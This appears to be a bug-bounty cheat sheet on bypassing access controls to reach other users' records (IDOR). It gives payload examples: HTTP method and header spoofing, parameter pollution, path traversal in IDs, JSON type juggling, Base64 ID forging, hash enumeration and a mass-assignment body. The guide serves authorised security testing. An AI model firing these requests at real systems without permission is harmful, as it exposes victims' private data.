# IDOR Bypass Techniques

> When a simple parameter swap is blocked, try these techniques to bypass access controls.
> Use only on authorized targets within program scope.

---

## 1. HTTP Method Tampering

The server may enforce access control only on GET but not on POST/HEAD/OPTIONS.

```http
# Original (blocked)
GET /api/invoice?invoice_id=VICTIM_ID

# Try alternatives
POST /api/invoice?invoice_id=VICTIM_ID
HEAD /api/invoice?invoice_id=VICTIM_ID
OPTIONS /api/invoice?invoice_id=VICTIM_ID
PUT /api/invoice?invoice_id=VICTIM_ID
```

---

## 2. HTTP Version Downgrade

Some WAF/middleware rules only apply to HTTP/1.1. Try HTTP/1.0 or HTTP/2.

```http
GET /api/invoice?invoice_id=VICTIM_ID HTTP/1.0
Host: target.example.com
```

---

## 3. Parameter Pollution (HPP)

Send the parameter twice — some backends use the first, some use the last.

```
# Use your own ID first, victim's ID second
GET /api/invoice?invoice_id=MY_ID&invoice_id=VICTIM_ID

# Use victim's ID first, your own second
GET /api/invoice?invoice_id=VICTIM_ID&invoice_id=MY_ID

# Array notation
GET /api/invoice?invoice_id[]=MY_ID&invoice_id[]=VICTIM_ID

# JSON body pollution
{"user_id": "MY_ID", "user_id": "VICTIM_ID"}
```

---

## 4. Path Traversal in ID

Try injecting traversal sequences into the ID field.

```
GET /api/users/MY_ID/../VICTIM_ID/profile
GET /api/users/MY_ID%2F..%2FVICTIM_ID/profile
GET /api/users/MY_ID/../../VICTIM_ID/invoice
```

---

## 5. Wildcard & Special Values

Try special characters that might bypass checks.

```
invoice_id=*
invoice_id=null
invoice_id=undefined
invoice_id=0
invoice_id=-1
invoice_id=
invoice_id=NaN
invoice_id=true
invoice_id[]=VICTIM_ID
```

---

## 6. JSON Type Juggling

Change the parameter type — some backends compare loosely.

```json
# String to Integer
{"user_id": "123"}   →   {"user_id": 123}

# Boolean injection
{"user_id": true}

# Array injection
{"user_id": ["MY_ID", "VICTIM_ID"]}

# Object injection
{"user_id": {"$gt": 0}}
```

---

## 7. Case / Encoding Manipulation

Alter the parameter name case or encoding.

```
# Case variants
?userId=VICTIM_ID
?USERID=VICTIM_ID
?User_Id=VICTIM_ID
?user-id=VICTIM_ID

# URL encoding
?user%5Fid=VICTIM_ID
?user_id%3DVICTIM_ID

# Double encoding
?user_id=%25%36%31 (double-encoded 'a')
```

---

## 8. Header-Based Object Reference

Some APIs use custom headers instead of URL params.

```http
GET /api/profile HTTP/1.1
Host: target.example.com
Authorization: Bearer ATTACKER_TOKEN
X-User-ID: VICTIM_USER_ID
X-Account-ID: VICTIM_ACCOUNT_ID
X-Forwarded-For: 127.0.0.1
X-Original-URL: /api/admin/users/VICTIM_ID
X-Rewrite-URL: /api/admin/users/VICTIM_ID
```

---

## 9. Referrer-Based Access Control Bypass

Some endpoints check the `Referer` header to validate origin.

```http
GET /api/admin/invoice?id=VICTIM_ID HTTP/1.1
Referer: https://target.example.com/admin/dashboard
```

---

## 10. ID Obfuscation — Decode and Re-encode

When IDs look like hashes or encoded strings:

```python
import base64, hashlib

# Base64 decode → modify → re-encode
decoded = base64.b64decode("dXNlcl8xMjM=")  # → b"user_123"
forged  = base64.b64encode(b"user_456")      # → b"dXNlcl80NTY="

# Hash ID → try MD5/SHA1 of sequential numbers
import hashlib
for i in range(1, 1000):
    print(hashlib.md5(str(i).encode()).hexdigest())
```

---

## 11. GUID / UUID Prediction

Even "random" UUIDs can be predictable:

- Check if UUIDs are v1 (time-based) → predictable from timestamp
- Look for UUIDs that differ only slightly between accounts
- Use `uuid_to_time` libraries to extract timestamp from v1 UUIDs

Tool: [uuid6](https://github.com/oittaa/uuid6-python)

---

## 12. Mass Assignment

Send extra fields in POST/PUT body that shouldn't be user-controlled.

```json
{
  "name": "Attacker",
  "email": "attacker@evil.com",
  "role": "admin",
  "user_id": "VICTIM_ID",
  "is_admin": true,
  "permissions": ["read", "write", "delete"]
}
```

---

## Quick Bypass Checklist

- [ ] HTTP method tampering (GET→POST→HEAD)
- [ ] Parameter pollution (double param, array form)
- [ ] Path traversal in ID (`../VICTIM_ID`)
- [ ] Wildcard / null / special values
- [ ] JSON type juggling (string→int, array)
- [ ] Custom headers (X-User-ID, X-Account-ID)
- [ ] Referer bypass
- [ ] Base64 / encoded ID modification
- [ ] UUID v1 timestamp prediction
- [ ] Mass assignment extra fields
